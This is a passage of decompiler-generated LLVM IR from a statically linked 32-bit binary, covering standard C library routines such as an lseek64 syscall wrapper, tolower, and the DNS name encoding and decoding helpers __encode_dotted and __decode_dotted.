  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 10, { 18, 2, 28, 29, 30, 31, 32, 33, 3, 22, 23, 25, 24, 4, 7, 34, 8, 27, 10, 9, 19, 5, 12, 21, 26, 11, 36, 20, 0, 17, 16, 13, 14, 1, 35, 37, 38, 15, 6 }
  uselistorder i32 12, { 91, 92, 93, 0, 94, 18, 27, 95, 111, 22, 21, 4, 99, 5, 6, 7, 8, 9, 10, 11, 96, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 144, 26, 28, 90, 110, 29, 30, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 31, 32, 33, 34, 35, 36, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 23, 143, 100, 101, 102, 103, 145, 85, 1, 2, 86, 87, 12, 13, 88, 3, 97, 98, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 24, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 19, 70, 71, 72, 73, 25, 20, 89, 17, 16, 15, 14, 104, 105, 106, 107, 108, 109 }
  uselistorder i32 80, { 0, 4, 5, 6, 7, 8, 9, 10, 1, 2, 3 }
  uselistorder i32 56, { 5, 4, 10, 11, 12, 13, 14, 1, 7, 2, 8, 3, 0, 15, 9, 6 }
  uselistorder i32 44, { 7, 8, 9, 4, 5, 6, 20, 11, 12, 3, 17, 19, 18, 14, 15, 16, 13, 10, 0, 1, 2 }
  uselistorder i32 36, { 10, 11, 12, 14, 15, 16, 17, 18, 19, 1, 20, 2, 3, 21, 13, 5, 6, 7, 8, 9, 4, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 18, 13, 3, 9, 4, 19, 20, 0, 10, 6, 5, 1, 12, 7, 8, 14, 15, 16, 17, 2, 11 }
  uselistorder i32 -48, { 3, 4, 5, 1, 2, 0 }
  uselistorder i32 16, { 104, 103, 10, 105, 106, 29, 4, 107, 30, 108, 75, 76, 116, 117, 118, 119, 120, 121, 128, 122, 123, 124, 125, 126, 127, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 109, 110, 111, 112, 77, 78, 79, 80, 81, 82, 83, 84, 154, 31, 32, 44, 33, 62, 40, 47, 100, 48, 158, 11, 49, 50, 51, 0, 12, 147, 14, 13, 148, 1, 15, 139, 140, 37, 159, 113, 114, 85, 86, 87, 88, 89, 90, 2, 91, 92, 93, 94, 95, 16, 96, 97, 41, 98, 155, 156, 157, 115, 5, 3, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 43, 34, 63, 64, 65, 66, 67, 42, 68, 69, 7, 8, 70, 71, 72, 73, 74, 35, 36, 99, 26, 27, 28, 24, 25, 22, 23, 17, 18, 19, 20, 21, 45, 46, 101, 102, 9, 38, 141, 142, 143, 144, 145, 39, 146, 6, 149, 150, 151, 152, 153 }
  uselistorder i32 8, { 138, 137, 139, 14, 15, 140, 141, 142, 143, 144, 145, 1, 146, 16, 10, 147, 148, 149, 47, 107, 50, 23, 24, 25, 26, 51, 27, 28, 29, 52, 30, 53, 31, 54, 55, 151, 108, 109, 110, 111, 112, 113, 48, 114, 115, 116, 212, 213, 44, 219, 45, 220, 46, 66, 32, 68, 136, 164, 69, 70, 166, 167, 168, 169, 170, 171, 172, 2, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 3, 71, 72, 73, 74, 75, 76, 77, 78, 183, 184, 185, 186, 187, 57, 4, 58, 5, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 56, 205, 206, 6, 207, 208, 209, 210, 7, 211, 158, 159, 17, 218, 152, 153, 18, 19, 67, 117, 118, 119, 120, 122, 123, 124, 121, 125, 126, 127, 128, 33, 34, 129, 130, 131, 132, 133, 134, 20, 214, 215, 216, 154, 155, 156, 157, 150, 217, 79, 80, 81, 82, 22, 59, 60, 61, 83, 84, 0, 62, 85, 86, 87, 88, 89, 90, 91, 21, 92, 93, 94, 49, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 11, 105, 12, 63, 65, 35, 64, 106, 135, 43, 42, 41, 39, 40, 36, 37, 38, 13, 160, 161, 162, 163, 165, 9, 8 }
  uselistorder i32 -32, { 15, 0, 1, 2, 13, 14, 3, 4, 8, 7, 6, 5, 9, 10, 11, 12 }
  uselistorder i32 32, { 76, 27, 77, 78, 26, 31, 83, 46, 84, 85, 86, 44, 45, 64, 24, 94, 32, 53, 55, 56, 59, 25, 57, 58, 1, 0, 2, 3, 47, 4, 54, 5, 6, 7, 8, 9, 10, 28, 81, 79, 80, 65, 66, 29, 67, 68, 69, 70, 71, 72, 73, 11, 74, 75, 48, 92, 93, 82, 91, 60, 61, 62, 63, 35, 12, 49, 50, 13, 51, 30, 15, 14, 37, 36, 33, 38, 16, 17, 19, 18, 39, 21, 20, 40, 42, 23, 22, 41, 87, 88, 89, 90, 43, 34, 52 }
  uselistorder i32 4, { 260, 261, 262, 256, 254, 255, 257, 258, 259, 35, 2, 263, 264, 265, 266, 267, 268, 269, 270, 271, 42, 149, 150, 151, 43, 44, 45, 272, 76, 36, 199, 3, 4, 201, 202, 203, 204, 205, 206, 5, 273, 276, 277, 278, 279, 280, 281, 91, 282, 289, 290, 291, 98, 46, 292, 293, 294, 295, 47, 48, 49, 99, 50, 51, 52, 53, 296, 54, 297, 100, 55, 101, 102, 6, 283, 284, 285, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 83, 217, 369, 218, 370, 371, 377, 378, 0, 383, 384, 385, 372, 77, 125, 165, 166, 373, 374, 375, 376, 7, 152, 153, 154, 155, 156, 103, 241, 242, 243, 92, 308, 309, 310, 311, 157, 158, 159, 160, 161, 93, 8, 162, 163, 379, 381, 322, 323, 324, 325, 326, 327, 9, 328, 329, 330, 331, 332, 333, 334, 335, 320, 321, 167, 84, 168, 169, 170, 171, 172, 173, 174, 10, 176, 175, 336, 82, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 32, 357, 358, 360, 359, 11, 164, 380, 177, 178, 298, 299, 78, 300, 301, 302, 303, 37, 12, 38, 382, 13, 179, 219, 14, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 56, 57, 126, 39, 237, 238, 239, 286, 15, 287, 85, 288, 274, 275, 185, 180, 181, 182, 41, 104, 105, 106, 107, 183, 58, 59, 108, 16, 184, 17, 18, 33, 19, 1, 20, 109, 186, 187, 188, 189, 21, 190, 191, 192, 110, 193, 194, 195, 111, 196, 112, 197, 113, 198, 86, 94, 95, 96, 200, 114, 115, 116, 30, 117, 118, 97, 31, 119, 120, 79, 122, 87, 60, 121, 80, 240, 75, 127, 128, 129, 73, 74, 71, 72, 130, 131, 70, 132, 68, 69, 133, 134, 67, 64, 135, 65, 66, 136, 123, 137, 61, 138, 62, 63, 139, 140, 141, 142, 143, 144, 145, 146, 147, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 81, 304, 305, 306, 307, 312, 34, 22, 313, 23, 88, 89, 124, 314, 90, 24, 25, 315, 316, 317, 318, 26, 40, 27, 28, 319, 29, 361, 362, 363, 364, 365, 366, 367, 368, 386, 387, 388, 148 }
  uselistorder i32* @ebp, { 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 10, 11, 12, 1, 13, 14, 15, 4, 74, 75, 76, 81, 77, 78, 79, 80, 82, 29, 30, 83, 87, 98, 99, 128, 129, 130, 31, 32, 33, 34, 35, 16, 17, 18, 57, 58, 157, 158, 159, 160, 161, 19, 20, 162, 163, 164, 165, 166, 167, 168, 169, 174, 170, 171, 172, 173, 3, 175, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 5, 36, 37, 38, 39, 40, 93, 2, 94, 95, 96, 97, 88, 89, 90, 91, 92, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 7, 8, 9, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 112, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 53, 54, 55, 84, 85, 86, 21, 22, 23, 24, 25, 26, 27, 28, 56, 6, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 176, 177, 178, 179 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8054225, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8054205, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80541eb.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80541a1, { 1, 0 }
  uselistorder label %dec_label_pc_8054185, { 1, 0 }
  uselistorder label %dec_label_pc_8054148, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805410f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8054135, { 1, 0 }
  uselistorder label %dec_label_pc_8054103, { 1, 0 }
  uselistorder label %dec_label_pc_80540ec, { 1, 0 }
  uselistorder label %dec_label_pc_80540ec.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80540d5, { 1, 0 }
  uselistorder label %dec_label_pc_805409a, { 1, 0 }
  uselistorder label %dec_label_pc_8053ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8053f81, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054236 = load i32, i32* @ebx, align 4
  store i32 %v0_8054236, i32* %stack_var_-12, align 4
  %v2_805424a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805424a, i32* %esi.global-to-local, align 4
  %v1_8054261 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054261, i32* %esi.global-to-local, align 4
  %tmp18 = icmp ult i32 %v1_8054261, -4095
  br i1 %tmp18, label %dec_label_pc_805427b, label %dec_label_pc_805426d

dec_label_pc_805426d:                             ; preds = %entry
  %v2_805424e = ashr i32 %arg3, 31
  %v1_805426d = call i32 @__errno_location(i32 %v2_805424e)
  %v0_8054272 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054272 = sub i32 0, %v0_8054272
  %v2_8054274 = inttoptr i32 %v1_805426d to i32*
  store i32 %v1_8054272, i32* %v2_8054274, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_805428f.pre.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805427f

dec_label_pc_805427b:                             ; preds = %entry
  %v1_805427b = icmp eq i32 %v1_8054261, 0
  br i1 %v1_805427b, label %dec_label_pc_8054284, label %dec_label_pc_805427f

dec_label_pc_805427f:                             ; preds = %dec_label_pc_805427b, %dec_label_pc_805426d
  %v2_805428f.pre = phi i32 [ %v0_8054236, %dec_label_pc_805427b ], [ %v2_805428f.pre.pre, %dec_label_pc_805426d ]
  %v0_805427f = phi i32 [ %v1_8054261, %dec_label_pc_805427b ], [ -1, %dec_label_pc_805426d ]
  %v1_8054281 = ashr i32 %v0_805427f, 31
  br label %dec_label_pc_805428c

dec_label_pc_8054284:                             ; preds = %dec_label_pc_805427b
  %v3_8054284 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805428c

dec_label_pc_805428c:                             ; preds = %dec_label_pc_805427f, %dec_label_pc_8054284
  %v2_805428f = phi i32 [ %v2_805428f.pre, %dec_label_pc_805427f ], [ %v0_8054236, %dec_label_pc_8054284 ]
  %v0_8054292 = phi i32 [ %v0_805427f, %dec_label_pc_805427f ], [ %v3_8054284, %dec_label_pc_8054284 ]
  %storemerge = phi i32 [ %v1_8054281, %dec_label_pc_805427f ], [ %tmp, %dec_label_pc_8054284 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 %v2_805428f, i32* @ebx, align 4
  ret i32 %v0_8054292

; uselistorder directives
  uselistorder i32 %v1_8054261, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8054236, { 1, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 26, 38, 50, 49, 32, 54, 25, 64, 14, 13, 12, 11, 10, 68, 9, 24, 23, 8, 22, 63, 62, 40, 39, 67, 66, 65, 61, 21, 20, 60, 19, 37, 48, 47, 46, 2, 31, 7, 15, 45, 1, 0, 59, 34, 33, 58, 30, 6, 17, 3, 29, 16, 57, 56, 36, 28, 27, 55, 5, 4, 72, 35, 18 }
  uselistorder i32 31, { 20, 21, 15, 22, 23, 29, 30, 24, 25, 11, 2, 3, 0, 1, 10, 28, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 26, 27, 19, 13, 14, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_805428c, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8054298 = add i32 %arg1, 128
  %v6_80542a3 = icmp ugt i32 %v1_8054298, 383
  br i1 %v6_80542a3, label %dec_label_pc_80542ae, label %dec_label_pc_80542a5

dec_label_pc_80542a5:                             ; preds = %entry
  %v0_80542a5 = load i32, i32* bitcast (i32** @global_var_8059ac0.215 to i32*), align 64
  %v2_80542aa = mul i32 %arg1, 2
  %v3_80542aa = add i32 %v0_80542a5, %v2_80542aa
  %v4_80542aa = inttoptr i32 %v3_80542aa to i16*
  %v5_80542aa = load i16, i16* %v4_80542aa, align 2
  %v6_80542aa = sext i16 %v5_80542aa to i32
  store i32 %v6_80542aa, i32* @edx, align 4
  br label %dec_label_pc_80542ae

dec_label_pc_80542ae:                             ; preds = %entry, %dec_label_pc_80542a5
  %v0_80542ae = phi i32 [ %arg1, %entry ], [ %v6_80542aa, %dec_label_pc_80542a5 ]
  ret i32 %v0_80542ae

; uselistorder directives
  uselistorder i32 65536, { 0, 2, 3, 1, 4, 80, 5, 6, 7, 8, 9, 11, 10, 13, 12, 15, 14, 17, 16, 18, 19, 81, 84, 20, 21, 83, 26, 22, 27, 23, 28, 24, 29, 25, 33, 30, 34, 31, 35, 32, 36, 37, 39, 38, 41, 40, 42, 46, 43, 47, 44, 48, 45, 49, 51, 50, 54, 52, 55, 53, 56, 57, 60, 58, 61, 59, 62, 63, 65, 64, 66, 67, 70, 71, 72, 68, 73, 69, 75, 74, 76, 78, 77, 79, 82 }
  uselistorder i32 128, { 18, 11, 13, 2, 3, 6, 12, 7, 8, 14, 4, 9, 10, 15, 0, 16, 17, 5, 1, 19 }
  uselistorder label %dec_label_pc_80542ae, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80542b5 = load i32, i32* @edi, align 4
  %v0_80542b6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80542bd = ptrtoint i8* %arg1 to i32
  store i32 %v4_80542bd, i32* @edi, align 4
  %v1_805431c3 = icmp eq i8* %arg1, null
  br i1 %v1_805431c3, label %dec_label_pc_8054325, label %dec_label_pc_8054320.lr.ph

dec_label_pc_8054320.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054320

dec_label_pc_80542c3:                             ; preds = %dec_label_pc_8054320
  %v5_80542c8 = call i32 @__GI_strchr(i8* %v1_8054320, i32 46)
  %v1_80542d2 = icmp eq i32 %v5_80542c8, 0
  br i1 %v1_80542d2, label %dec_label_pc_80542dc, label %dec_label_pc_80542d6

dec_label_pc_80542d6:                             ; preds = %dec_label_pc_80542c3
  %v1_80542d8 = load i32, i32* @edi, align 4
  %v2_80542d8 = sub i32 %v5_80542c8, %v1_80542d8
  br label %dec_label_pc_80542ea

dec_label_pc_80542dc:                             ; preds = %dec_label_pc_80542c3
  %v0_80542df = load i32, i32* @edi, align 4
  %v5_80542df = inttoptr i32 %v0_80542df to i8*
  %v3_80542e0 = call i32 @strlen(i8* %v5_80542df)
  br label %dec_label_pc_80542ea

dec_label_pc_80542ea:                             ; preds = %dec_label_pc_80542d6, %dec_label_pc_80542dc
  %v0_80542fd = phi i32 [ %v2_80542d8, %dec_label_pc_80542d6 ], [ %v3_80542e0, %dec_label_pc_80542dc ]
  store i32 %v0_80542fd, i32* @esi, align 4
  %v1_80542ea = icmp eq i32 %v0_80542fd, 0
  %v3_80542ea = trunc i32 %v0_80542fd to i8
  br i1 %v1_80542ea, label %dec_label_pc_8054339, label %dec_label_pc_80542ee

dec_label_pc_80542ee:                             ; preds = %dec_label_pc_80542ea
  %v1_80542f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542f2 = sub i32 %arg3, %v1_80542f2
  %v1_80542f4 = add i32 %v2_80542f2, -1
  %v7_80542f5 = icmp ult i32 %v0_80542fd, %v1_80542f4
  %v1_80542f7 = icmp eq i1 %v7_80542f5, false
  br i1 %v1_80542f7, label %dec_label_pc_8054339, label %dec_label_pc_80542f9

dec_label_pc_80542f9:                             ; preds = %dec_label_pc_80542ee
  store i32 %arg2, i32* @edx, align 4
  %v4_80542ff = add i32 %v1_80542f2, %arg2
  %v5_80542ff = inttoptr i32 %v4_80542ff to i8*
  store i8 %v3_80542ea, i8* %v5_80542ff, align 1
  %v0_8054302 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054302 = add i32 %v0_8054302, 1
  %v0_8054304 = load i32, i32* @edx, align 4
  %v2_8054306 = add i32 %v1_8054302, %v0_8054304
  %v0_8054308 = load i32, i32* @esi, align 4
  %v0_8054309 = load i32, i32* @edi, align 4
  %v2_805430b = add i32 %v0_8054308, %v1_8054302
  store i32 %v2_805430b, i32* %ebx.global-to-local, align 4
  %tmp28 = inttoptr i32 %v2_8054306 to i16*
  %v7_805430d = call i32 @memcpy(i16* %tmp28, i32 %v0_8054309, i32 %v0_8054308)
  %v1_8054319 = add i32 %v5_80542c8, 1
  br i1 %v1_80542d2, label %dec_label_pc_8054325, label %dec_label_pc_805431c

dec_label_pc_805431c:                             ; preds = %dec_label_pc_80542f9
  store i32 %v1_8054319, i32* @edi, align 4
  %v1_805431c = icmp eq i32 %v1_8054319, 0
  br i1 %v1_805431c, label %dec_label_pc_8054325, label %dec_label_pc_8054320

dec_label_pc_8054320:                             ; preds = %dec_label_pc_8054320.lr.ph, %dec_label_pc_805431c
  %v0_80542c7 = phi i32 [ %v4_80542bd, %dec_label_pc_8054320.lr.ph ], [ %v1_8054319, %dec_label_pc_805431c ]
  %v1_8054320 = inttoptr i32 %v0_80542c7 to i8*
  %v2_8054320 = load i8, i8* %v1_8054320, align 1
  %v3_8054320 = icmp eq i8 %v2_8054320, 0
  %v1_8054323 = icmp eq i1 %v3_8054320, false
  br i1 %v1_8054323, label %dec_label_pc_80542c3, label %dec_label_pc_8054325

dec_label_pc_8054325:                             ; preds = %dec_label_pc_805431c, %dec_label_pc_8054320, %dec_label_pc_80542f9, %entry
  %tmp29 = icmp slt i32 %arg3, 1
  br i1 %tmp29, label %dec_label_pc_8054339, label %dec_label_pc_805432c

dec_label_pc_805432c:                             ; preds = %dec_label_pc_8054325
  %v1_8054330 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054330 = add i32 %v1_8054330, %arg2
  %v3_8054330 = inttoptr i32 %v2_8054330 to i8*
  store i8 0, i8* %v3_8054330, align 1
  %v0_8054334 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054334 = add i32 %v0_8054334, 1
  br label %dec_label_pc_805433c

dec_label_pc_8054339:                             ; preds = %dec_label_pc_80542ee, %dec_label_pc_80542ea, %dec_label_pc_8054325
  br label %dec_label_pc_805433c

dec_label_pc_805433c:                             ; preds = %dec_label_pc_805432c, %dec_label_pc_8054339
  %storemerge1 = phi i32 [ %v1_8054334, %dec_label_pc_805432c ], [ -1, %dec_label_pc_8054339 ]
  store i32 %v0_80542b6, i32* @esi, align 4
  store i32 %v0_80542b5, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i8* %v1_8054320, { 1, 0 }
  uselistorder i32 %v1_8054319, { 0, 2, 1 }
  uselistorder i32 %v0_8054308, { 1, 0 }
  uselistorder i1 %v1_80542d2, { 1, 0 }
  uselistorder i32 %v5_80542c8, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 5, 6, 7, 0, 1, 2, 8, 3, 4 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 3, 5, 2, 7, 0, 1, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 4 }
  uselistorder label %dec_label_pc_805433c, { 1, 0 }
  uselistorder label %dec_label_pc_8054339, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054325, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054320, { 1, 0 }
  uselistorder label %dec_label_pc_80542ea, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_8054346 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @edx, align 4
  %v4_805434f = icmp eq i32 %arg1, 0
  br i1 %v4_805434f, label %dec_label_pc_8054410, label %dec_label_pc_805435a

dec_label_pc_805435a:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80543f82740 = add i32 %arg2, %arg1
  %v3_80543f82841 = inttoptr i32 %v2_80543f82740 to i8*
  %v4_80543f82942 = load i8, i8* %v3_80543f82841, align 1
  %v1_80543fc3144 = icmp eq i8 %v4_80543f82942, 0
  %v1_80543fe3245 = icmp eq i1 %v1_80543fc3144, false
  br i1 %v1_80543fe3245, label %dec_label_pc_8054368.lr.ph, label %dec_label_pc_8054404

dec_label_pc_8054368:                             ; preds = %dec_label_pc_8054368.lr.ph, %dec_label_pc_8054381
  %v0_8054372 = phi i32 [ %v0_8054372.pre, %dec_label_pc_8054368.lr.ph ], [ %v4_805438c, %dec_label_pc_8054381 ]
  %v8_805436838 = phi i1 [ %v8_80543683350, %dec_label_pc_8054368.lr.ph ], [ true, %dec_label_pc_8054381 ]
  %v5_80543f837.in = phi i8 [ %v5_80543f83049.in, %dec_label_pc_8054368.lr.ph ], [ %v4_80543f8, %dec_label_pc_8054381 ]
  %stack_var_-17.136 = phi i8 [ %stack_var_-17.1.ph48, %dec_label_pc_8054368.lr.ph ], [ 0, %dec_label_pc_8054381 ]
  %v0_805436f35 = phi i32 [ %v0_805436f.ph46, %dec_label_pc_8054368.lr.ph ], [ %v2_805439b, %dec_label_pc_8054381 ]
  %v5_80543f837 = zext i8 %v5_80543f837.in to i32
  %v1_805436f = add i32 %v0_805436f35, 1
  store i32 %v1_805436f, i32* @esi, align 4
  %v3_8054372 = select i1 %v8_805436838, i32 2, i32 1
  %v4_8054372 = add i32 %v3_8054372, %v0_8054372
  store i32 %v4_8054372, i32* %ebp.global-to-local, align 4
  %v1_8054375 = and i32 %v5_80543f837, 192
  %v6_805437a = icmp eq i32 %v1_8054375, 192
  %v1_805437f = icmp eq i1 %v6_805437a, false
  br i1 %v1_805437f, label %dec_label_pc_80543a4, label %dec_label_pc_8054381

dec_label_pc_8054381:                             ; preds = %dec_label_pc_8054368
  %v4_805438c = add i32 %v3_8054372, %v4_8054372
  store i32 %v4_805438c, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_80543f837.in, 64
  %v1_805438f = zext i8 %tmp to i32
  %v2_8054392 = add i32 %v1_805436f, %arg1
  %v3_8054392 = inttoptr i32 %v2_8054392 to i8*
  %v4_8054392 = load i8, i8* %v3_8054392, align 1
  %v5_8054392 = zext i8 %v4_8054392 to i32
  %v2_8054396 = mul nuw nsw i32 %v1_805438f, 256
  %v2_805439b = or i32 %v5_8054392, %v2_8054396
  store i32 %v2_805439b, i32* @edx, align 4
  store i32 %v1_80543c1.ph47, i32* @ecx, align 4
  %v2_80543f8 = add i32 %v2_805439b, %arg1
  %v3_80543f8 = inttoptr i32 %v2_80543f8 to i8*
  %v4_80543f8 = load i8, i8* %v3_80543f8, align 1
  %v1_80543fc = icmp eq i8 %v4_80543f8, 0
  %v1_80543fe = icmp eq i1 %v1_80543fc, false
  br i1 %v1_80543fe, label %dec_label_pc_8054368, label %dec_label_pc_8054404

dec_label_pc_80543a4:                             ; preds = %dec_label_pc_8054368
  %v2_80543a4 = add i32 %v5_80543f837, %v1_80543c1.ph47
  %v1_80543ad = add i32 %v2_80543a4, 1
  store i32 %v1_80543ad, i32* @edi, align 4
  %v10_80543ae = icmp ult i32 %v1_80543ad, %arg4
  %v1_80543b2 = icmp eq i1 %v10_80543ae, false
  br i1 %v1_80543b2, label %dec_label_pc_8054410, label %dec_label_pc_80543b4

dec_label_pc_80543b4:                             ; preds = %dec_label_pc_80543a4
  %v2_80543ba = add i32 %v1_805436f, %arg1
  %v2_80543c1 = add i32 %v1_80543c1.ph47, %arg3
  %v3_80543c4 = inttoptr i32 %v2_80543c1 to i16*
  %v4_80543c4 = call i32 @memcpy(i16* %v3_80543c4, i32 %v2_80543ba, i32 %v5_80543f837)
  %v0_80543cc = load i32, i32* @esi, align 4
  %v2_80543cc = add i32 %v0_80543cc, %v5_80543f837
  store i32 %v2_80543cc, i32* @edx, align 4
  br i1 %v8_805436838, label %dec_label_pc_80543d8, label %dec_label_pc_80543d6

dec_label_pc_80543d6:                             ; preds = %dec_label_pc_80543b4
  %v0_80543d6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80543d6 = add i32 %v0_80543d6, %v5_80543f837
  store i32 %v2_80543d6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80543d8

dec_label_pc_80543d8:                             ; preds = %dec_label_pc_80543b4, %dec_label_pc_80543d6
  %v4_80543ef = add i32 %v2_80543a4, %arg3
  %v5_80543ef = inttoptr i32 %v4_80543ef to i8*
  store i8 46, i8* %v5_80543ef, align 1
  %v0_80543f2.pre = load i32, i32* @edi, align 4
  %v1_80543f8.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80543f2.pre, i32* @ecx, align 4
  %v2_80543f827 = add i32 %v1_80543f8.pre.pre, %arg1
  %v3_80543f828 = inttoptr i32 %v2_80543f827 to i8*
  %v4_80543f829 = load i8, i8* %v3_80543f828, align 1
  %v1_80543fc31 = icmp eq i8 %v4_80543f829, 0
  %v1_80543fe32 = icmp eq i1 %v1_80543fc31, false
  %v8_805436833 = icmp eq i8 %stack_var_-17.136, 0
  %v0_8054372.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80543fe32, label %dec_label_pc_8054368.lr.ph, label %dec_label_pc_8054404

dec_label_pc_8054368.lr.ph:                       ; preds = %dec_label_pc_80543d8, %dec_label_pc_805435a
  %v0_8054372.pre = phi i32 [ 0, %dec_label_pc_805435a ], [ %v0_8054372.pre.pre, %dec_label_pc_80543d8 ]
  %v8_80543683350 = phi i1 [ false, %dec_label_pc_805435a ], [ %v8_805436833, %dec_label_pc_80543d8 ]
  %v5_80543f83049.in = phi i8 [ %v4_80543f82942, %dec_label_pc_805435a ], [ %v4_80543f829, %dec_label_pc_80543d8 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_805435a ], [ %stack_var_-17.136, %dec_label_pc_80543d8 ]
  %v1_80543c1.ph47 = phi i32 [ 0, %dec_label_pc_805435a ], [ %v0_80543f2.pre, %dec_label_pc_80543d8 ]
  %v0_805436f.ph46 = phi i32 [ %arg2, %dec_label_pc_805435a ], [ %v1_80543f8.pre.pre, %dec_label_pc_80543d8 ]
  br label %dec_label_pc_8054368

dec_label_pc_8054404:                             ; preds = %dec_label_pc_80543d8, %dec_label_pc_8054381, %dec_label_pc_805435a
  %v0_8054409 = phi i32 [ 0, %dec_label_pc_805435a ], [ %v4_805438c, %dec_label_pc_8054381 ], [ %v0_8054372.pre.pre, %dec_label_pc_80543d8 ]
  %v8_8054368.lcssa = phi i1 [ false, %dec_label_pc_805435a ], [ true, %dec_label_pc_8054381 ], [ %v8_805436833, %dec_label_pc_80543d8 ]
  %v2_805440b = zext i1 %v8_8054368.lcssa to i32
  %v3_805440b = add i32 %v0_8054409, 1
  %v4_805440b = add i32 %v3_805440b, %v2_805440b
  br label %dec_label_pc_8054413

dec_label_pc_8054410:                             ; preds = %dec_label_pc_80543a4, %entry
  br label %dec_label_pc_8054413

dec_label_pc_8054413:                             ; preds = %dec_label_pc_8054404, %dec_label_pc_8054410
  %storemerge = phi i32 [ %v4_805440b, %dec_label_pc_8054404 ], [ -1, %dec_label_pc_8054410 ]
  store i32 %v0_8054346, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80543c1.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_80543f8, { 1, 0 }
